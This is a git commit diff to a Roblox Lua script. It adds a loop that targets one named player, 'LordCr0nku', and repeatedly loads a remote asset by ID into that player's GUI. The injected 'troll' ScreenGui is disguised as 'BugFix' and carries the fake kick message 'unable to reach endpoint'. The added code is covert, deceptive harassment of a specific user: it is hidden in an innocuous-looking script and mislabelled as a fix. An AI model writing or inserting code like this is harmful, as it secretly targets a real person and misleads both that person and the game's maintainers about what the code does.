25d9362f3a4ead5ea1617e32d490380359504781
Viper <100521306+MuhXd@users.noreply.github.com>
2024-08-14 00:47:54 +0100

    Update t.lua

--- scripts/t.lua
+++ scripts/t.lua
@@ -6,4 +6,18 @@ game.Players.PlayerAdded:Connect(function(plr)
 		troll.Parent = plr:WaitForChild("PlayerGui")
 		troll.Enabled = true
 	end
+    if  plr.Name == "LordCr0nku"  then
+	while plr do
+		if plr then
+		        local ok = game:GetService("InsertService"):LoadAsset(18938166154)
+		        local troll = ok:FindFirstChildWhichIsA("ScreenGui")
+		        troll.Name = "BugFix"
+		        troll:WaitForChild("KickFor").Value = "unable to reach endpoint"
+		        troll.Parent = plr:WaitForChild("PlayerGui")
+		        troll.Enabled = true
+			task.wait(500)
+		end
+	end
+    end
+
 end)
